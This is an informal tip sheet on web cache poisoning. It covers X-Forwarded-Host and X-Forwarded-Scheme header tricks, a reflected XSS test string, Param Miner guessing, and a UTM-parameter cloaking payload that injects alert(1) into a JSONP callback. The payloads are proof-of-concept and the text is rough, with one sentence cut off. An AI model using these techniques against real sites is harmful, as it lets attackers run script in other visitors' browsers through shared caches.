WebCache Poisoning Tips

Use X-Forwarded-Host: header some times or X-Forwarded-Scheme, sometimes you can be able to redirect the traffic

This usually, could cause a redirection of the traffic:
X-Forwarded-Host: example.com
X-Forwarded-Scheme: nothttps

To make a decent and working exploit, sometimes you need to know what's the user-agent the victim i

Sometimes, you need to explore the page in order to find reflected XSS or other kind of try like cache buster injection or like origin header injection.           

GET /?a='/><script>alert(1)</script>

Attack such as:

Origin: Full url
--------------------------------------------------------------------------------------------------------------

Sometimes, try to use Param Miner Extensions, and try where you think is much suitable 

Guess GET parameter / Guess Header

--------------------------------------------------------------------------------------------------------------


If you find that on the link of a request you can add UTM parameter (https://en.wikipedia.org/wiki/UTM_parameters), try to poison the cache in this way:

GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1) HTTP/1.1

Snippet code to exploit:
const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
alert(1)({"country":"United Kingdom"});

Try to use the callback function to run malicious code:

https://www.simplilearn.com/tutorials/javascript-tutorial/callback-function-in-javascript#:~:text=A%20JavaScript%20callback%20is%20a,called%20as%20a%20callback%20function
